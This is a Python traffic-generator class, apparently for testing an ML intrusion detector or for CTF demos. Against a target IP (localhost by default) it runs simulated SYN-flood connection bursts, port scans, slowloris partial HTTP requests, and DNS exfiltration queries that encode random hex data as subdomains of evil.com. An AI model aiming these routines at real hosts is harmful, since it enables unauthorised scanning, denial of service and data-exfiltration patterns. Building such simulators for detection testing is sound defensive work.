#!/usr/bin/env python3
import socket
import threading
import time
import random

class AttackSimulator:
    """Generates synthetic traffic for demos and CTFs."""
    
    def __init__(self, target_ip="127.0.0.1"):
        self.target_ip = target_ip
        self._stop_event = threading.Event()
        self._thread = None

    def start(self):
        if self._thread is None:
            self._thread = threading.Thread(target=self._run, daemon=True)
            self._thread.start()

    def stop(self):
        self._stop_event.set()

    def _run(self):
        print(f"[simulator] Starting attack simulation against {self.target_ip}")
        # Give the ML baseline a few seconds to initialize
        time.sleep(2)
        while not self._stop_event.is_set():
            attack = random.choice([self._syn_flood, self._port_scan, self._slow_loris, self._dns_exfil])
            attack()
            time.sleep(random.uniform(1, 3))

    def _syn_flood(self):
        # Simulate SYN flood by rapidly creating connections and abandoning them
        for _ in range(30):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.01)
                s.connect((self.target_ip, random.randint(1024, 65535)))
            except Exception:
                pass

    def _port_scan(self):
        start_port = random.randint(20, 100)
        for port in range(start_port, start_port + 20):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.05)
                s.connect_ex((self.target_ip, port))
                s.close()
            except Exception:
                pass

    def _slow_loris(self):
        try:
            sockets = []
            for _ in range(5):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                # Traffic is generated regardless of whether port 80 is open
                if s.connect_ex((self.target_ip, 80)) == 0:
                    s.send("GET / HTTP/1.1\r\nHost: localhost\r\n".encode())
                    sockets.append(s)
            
            for s in sockets:
                try:
                    s.send("X-a: b\r\n".encode())
                    s.close()
                except Exception:
                    pass
        except Exception:
            pass

    def _dns_exfil(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(5):
                hex_data = "".join(random.choices("0123456789abcdef", k=64))
                domain = f"{hex_data}.evil.com"
                s.sendto(domain.encode(), (self.target_ip, 53))
        except Exception:
            pass
